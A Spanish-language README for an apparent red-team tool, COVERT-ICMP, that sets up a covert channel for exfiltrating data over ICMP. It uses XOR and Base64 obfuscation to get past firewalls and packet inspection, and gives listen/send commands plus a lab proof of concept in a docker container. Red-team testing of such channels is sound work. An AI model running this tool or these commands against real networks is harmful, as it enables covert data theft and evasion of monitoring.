VAMPSECURE INTELLIGENCE - COVERT-ICMP v1.1 (SHADOW PULSE)
================================================================================

DESCRIPCIÓN:
Herramienta de Red Team para la creación de canales de comunicación encubiertos 
y exfiltración de datos sobre el protocolo ICMP (Protocolo 1). Utiliza técnicas 
de ofuscación XOR y Base64 para evadir firewalls e inspección de paquetes.

CARACTERÍSTICAS:
- Bypass de filtros de puerto (Protocolo 1).
- Capa de ofuscación dinámica con clave secreta (Shadow Layer).
- Modo dual: Emisor (Sender) y Receptor (Listener).
- Bajo ruido: No abre puertos TCP/UDP.

USO:
Escucha: python3 scripts/covert_icmp/covert_icmp.py -m listen -i [INTERFAZ]
Envío:   python3 scripts/covert_icmp/covert_icmp.py -m send -t [IP_DESTINO] -d [MENSAJE]

PRUEBA DE CONCEPTO (PoC):
1. Iniciar Receptor (Terminal 1):
   docker exec -it -u root vamp_python_lab python scripts/covert_icmp/covert_icmp.py -m listen -i eth0

2. Enviar Datos (Terminal 2):
   docker exec -it -u root vamp_python_lab python scripts/covert_icmp/covert_icmp.py -m send -t 172.17.0.3 -d "TOP_SECRET_VAMP_2026"

RESULTADO ESPERADO:
El tráfico en red se verá como paquetes ICMP Echo Request con carga útil Base64. 
El receptor descifrará el mensaje en tiempo real mostrando el "Clear Text".
